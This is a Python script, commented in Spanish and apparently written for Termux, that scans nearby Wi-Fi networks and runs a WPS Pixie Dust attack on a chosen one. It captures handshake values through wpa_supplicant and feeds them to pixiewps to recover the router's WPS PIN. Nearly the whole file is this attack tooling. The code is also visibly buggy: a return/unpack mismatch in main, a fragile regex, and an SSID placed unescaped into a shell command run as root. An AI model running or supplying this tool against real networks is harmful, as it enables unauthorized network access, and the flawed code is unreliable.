import subprocess
import re
import os
import tempfile
import time
from tabulate import tabulate

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida en tiempo real"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    for line in process.stdout:
        print(line.strip())  # Mostrar cada línea en tiempo real
    
    stdout, stderr = process.communicate()
    return stdout, stderr

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def is_valid_bssid(bssid):
    """Verifica si un BSSID es válido"""
    return re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", bssid) is not None

def scan_wifi(interface):
    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    intensidades = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssid = bssid.split('(')[0]  # Limpiar el BSSID
            if is_valid_bssid(bssid):
                bssids.append(bssid)
            else:
                bssids.append(None)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                channel = int((freq - 2407) / 5)
                canales.append(channel)
            except ValueError:
                canales.append(None)
        if "signal" in linea:
            signal = linea.split(':')[1].strip()
            intensidades.append(signal)
    return redes, bssids, canales, intensidades

def create_wpa_supplicant_conf(ssid):
    """Crea un archivo de configuración temporal para wpa_supplicant"""
    conf_content = f"""
network={{
    ssid="{ssid}"
    key_mgmt=NONE
}}
"""
    conf_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    conf_file.write(conf_content)
    conf_file.close()
    return conf_file.name

def capture_wps_data(interface, ssid):
    """Captura los datos necesarios para el ataque Pixie Dust usando wpa_supplicant"""
    print(f"Capturando datos WPS de la red con SSID '{ssid}'...")
    conf_file = create_wpa_supplicant_conf(ssid)
    wpa_supplicant_path = "/data/data/com.termux/files/usr/bin/wpa_supplicant"
    wpa_supplicant_command = f"{wpa_supplicant_path} -i {interface} -c {conf_file} -dd"

    print(f"\nIniciando wpa_supplicant con el siguiente comando:\n{wpa_supplicant_command}")
    stdout, stderr = run_command(wpa_supplicant_command, use_sudo=True)
    
    os.remove(conf_file)  # Eliminar el archivo de configuración temporal

    # Extraer los valores necesarios
    pke = extract_value(stdout, "PKE:")
    pkr = extract_value(stdout, "PKR:")
    ehash1 = extract_value(stdout, "E-Hash1:")
    ehash2 = extract_value(stdout, "E-Hash2:")
    authkey = extract_value(stdout, "AuthKey:")
    enonce = extract_value(stdout, "E-Nonce:")

    print("\n--- Datos capturados por wpa_supplicant ---")
    print(f"PKE: {pke}")
    print(f"PKR: {pkr}")
    print(f"E-Hash1: {ehash1}")
    print(f"E-Hash2: {ehash2}")
    print(f"AuthKey: {authkey}")
    print(f"E-Nonce: {enonce}")
    print("------------------------------------------")

    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar todos los datos necesarios para el ataque Pixie Dust.")
        return None, None, None, None, None, None

    return pke, pkr, ehash1, ehash2, authkey, enonce

def perform_pixie_dust_attack(interface, ssid):
    """Realiza el ataque Pixie Dust usando los datos capturados de wpa_supplicant"""
    print(f"\nIniciando ataque Pixie Dust en SSID: {ssid}")

    # Capturar los datos necesarios usando wpa_supplicant
    pke, pkr, ehash1, ehash2, authkey, enonce = capture_wps_data(interface, ssid)
    if not all([pke, pkr, ehash1, ehash2, authkey, enonce]):
        print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
        return

    # Ejecutar pixiewps con los valores capturados
    pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
    print(f"Ejecutando pixiewps: {pixiewps_command}")
    process = subprocess.Popen(pixiewps_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    for line in process.stdout:
        print(line.strip())  # Mostrar la salida de pixiewps en tiempo real
    
    pixie_stdout, pixie_stderr = process.communicate()

    print("\n--- Salida de pixiewps ---")
    print(pixie_stdout)
    print(pixie_stderr)

    if "WPS pin:" in pixie_stdout:
        pin = extract_value(pixie_stdout, "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def main():
    os.system('clear')

    # Verificar herramientas necesarias
    tools = ["iw", "wpa_supplicant", "pixiewps"]
    for tool in tools:
        if subprocess.run(["which", tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
            print(f"Error: {tool} no está disponible en el sistema.")
            return

    scan_interface = "wlan1"
    redes, bssids, signals = scan_wifi(scan_interface)

    if redes:
        print("\nRedes disponibles:")
        tabla_redes = [[i + 1, redes[i], bssids[i], signals[i]] for i in range(len(redes))]
        print(tabulate(tabla_redes, headers=["#", "SSID", "BSSID", "Señal"], tablefmt="grid"))

        try:
            seleccion = int(input("\nSelecciona la red que deseas auditar (número): ")) - 1
            if seleccion < 0 or seleccion >= len(redes):
                print("Selección inválida.")
                return
            ssid_seleccionado = redes[seleccion]

            print(f"\nRed seleccionada: {ssid_seleccionado}\n")
            perform_pixie_dust_attack(scan_interface, ssid_seleccionado)
        except ValueError:
            print("Entrada inválida.")
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()



